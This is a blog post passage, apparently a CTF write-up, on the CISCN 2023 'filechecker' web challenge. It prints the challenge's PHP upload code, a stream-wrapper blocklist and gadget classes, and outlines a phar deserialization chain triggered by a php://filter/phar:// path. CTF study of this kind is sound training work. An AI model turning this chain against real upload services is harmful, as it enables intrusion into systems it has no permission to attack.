@@ -1,0 +1,1193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="xiaolaisec">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://laijunyue.github.io/2025/10/23/ciscn 2023 web/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="filechecker考点：Phar反序列化 可触发phar反序列化的函数   本题的mime_content_type()也可触发phar反序列化 思路 1234参考：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MjM5NTc2MDYxMw&#x3D;&#x3D;&amp;mid&#x3D;2458495767&amp;idx&#x3D;1&amp;sn&#x3D;d8b983b0bfdc74f00a00d91091f99">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN 2023 WEB 复现">
+<meta property="og:url" content="http://laijunyue.github.io/2025/10/23/CISCN%202023%20WEB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="filechecker考点：Phar反序列化 可触发phar反序列化的函数   本题的mime_content_type()也可触发phar反序列化 思路 1234参考：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MjM5NTc2MDYxMw&#x3D;&#x3D;&amp;mid&#x3D;2458495767&amp;idx&#x3D;1&amp;sn&#x3D;d8b983b0bfdc74f00a00d91091f99">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/23/images/image-20251022153514629.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004114349452.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004114459215.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004113649174.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004155400646.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004161747831.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004161857507.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004171232041.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004174835290.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004175111920.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004180123656.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251004180157885.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251005165623243.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251005152626153.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251005161447974.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251006184147541.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251006190409462.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251022160724194.png">
+<meta property="og:image" content="http://laijunyue.github.io/2025/10/23/images/image-20251007180426838.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251007172808402.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251007173603543.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251007173754781.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251007175022997.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251007175246055.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251007175318663.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251007175433441.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251007175813658.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251007180237413.png">
+<meta property="article:published_time" content="2025-10-23T10:12:47.000Z">
+<meta property="article:modified_time" content="2025-10-24T10:33:38.204Z">
+<meta property="article:author" content="xiaolaisec">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laijunyue.github.io/2025/10/23/images/image-20251022153514629.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/background.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/background.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/background.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            CISCN 2023 WEB 复现 -
+        
+        Welcome to xiaolaisec&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Welcome to xiaolaisec&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background.jpg","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["欢迎来到我的博客(｡･∀･)ﾉﾞ","悟已往之不谏，知来者之可追...","随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Welcome to xiaolaisec&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">13</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">29</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">CISCN 2023 WEB 复现</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/xiaolai.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-10-23 18:12:47</span>
+        <span class="mobile">2025-10-23 18:12:47</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-10-24 18:33:38</span>
+            <span class="mobile">2025-10-24 18:33:38</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="filechecker"><a href="#filechecker" class="headerlink" title="filechecker"></a>filechecker</h1><p><strong>考点：Phar反序列化</strong></p>
+<p>可触发phar反序列化的函数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="../images/image-20251022153514629.png"
+                      alt="image-20251022153514629" style="zoom:80%;" 
+                >
+
+<p>本题的<code>mime_content_type()</code>也可触发phar反序列化</p>
+<p><strong>思路</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考：https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458495767&amp;idx=1&amp;sn=d8b983b0bfdc74f00a00d91091f997e9&amp;chksm=b18e9b9d86f9128bf906f8cb7d6a07c3f9d80c29a3cd081fa7040d9689573e0b4c3262b82444&amp;scene=27</span><br><span class="line"></span><br><span class="line">构造pop链 -&gt; 生成phar文件 -&gt; 修改属性数量和修复签名绕过wakeup(PHP/7.0.8) -&gt; 改后缀名为.jpg </span><br><span class="line">-&gt; 上传，php://filter/convert.base64-encode/resource=phar://./upload/8a7370ab45d47bd283dd70f15d333623.jpg触发phar反序列化</span><br></pre></td></tr></table></figure></div>
+
+<p>下载附件，简单的文件上传功能</p>
+<p>index.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;filename:&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;file.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;goto filecheck.php&quot;</span>;</span><br><span class="line"><span class="variable">$filepath</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;filepath&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="variable">$filepath</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t give me dangerous code&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$filepath</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$mime</span>= <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$filepath</span>);  <span class="comment">//mime_content_type()可触发phar反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Image format is&quot;</span>.<span class="variable">$mime</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>file.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Please upload images in jpg png gif format&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move_File</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;upload sucess! image saved :upload/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_check</span>())&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_File</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>class.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">file</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data=<span class="string">&#x27;you need do something&#x27;</span>;   <span class="comment">//绕过__wakeup</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ou-&gt;b=<span class="string">&#x27;78ty7badh2&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;data) == <span class="string">&quot;Hellociscccn&quot;</span>) &#123;   <span class="comment">//$this-&gt;data = &quot;data://text/plain,Hellociscccn&quot;;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name-&gt;<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>;   <span class="comment">//__call</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">data</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span 